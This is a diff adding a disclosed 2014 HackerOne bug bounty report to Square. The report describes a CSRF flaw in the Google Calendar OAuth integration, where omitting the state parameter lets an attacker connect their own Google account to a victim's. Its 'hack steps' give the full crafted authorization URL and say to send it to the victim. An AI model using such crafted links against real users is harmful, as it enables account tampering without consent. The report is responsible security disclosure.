@@ -1,0 +1,21 @@
+ReportLink:https://hackerone.com/reports/30011
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/adrianbelen
+ReportedTo:Square(square)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:18.12.2014 23:30:13
+
+Summary:
+
+**state parameter** on oauth 2 application is used to prevent csrf attack!. i have found that if i removed the state parameter on google calendar integration, the integration is still work so your so attacker can connects his google account on his victim user.
+
+**HACK STEPS**
+* GET THE GOOGLE CALENDAR INTERGATION LINK  AND REMOVE THE STATE PARAMETER
+
+https://accounts.google.com/o/oauth2/auth?scope=https://www.googleapis.com/auth/userinfo.email+https://www.googleapis.com/auth/calendar+https://www.googleapis.com/auth/calendar.readonly&response_type=code&redirect_uri=https://squareup.com/appointments/sync/auth/google_oauth2/callback&access_type=offline& **state=4f928094577e336b811bd05cae0739dd4fbb141111db9a4f**&prompt=consent&client_id=239025240884-m1e8rg630gtvomirfmg13p6kggl9rm35.apps.googleusercontent.com&hl=fil&from_login=1&as=-20822a32d064f99d&pli=1&authuser=0
+
+* TO THIS https://accounts.google.com/o/oauth2/auth?scope=https://www.googleapis.com/auth/userinfo.email+https://www.googleapis.com/auth/calendar+https://www.googleapis.com/auth/calendar.readonly&response_type=code&redirect_uri=https://squareup.com/appointments/sync/auth/google_oauth2/callback&access_type=offline&prompt=consent&client_id=239025240884-m1e8rg630gtvomirfmg13p6kggl9rm35.apps.googleusercontent.com&hl=fil&from_login=1&as=-5b63c84d3afd7af9&pli=1&authuser=0
+
+* NOW SEND THIS CSRF LINK TO YOUR VICTIM 
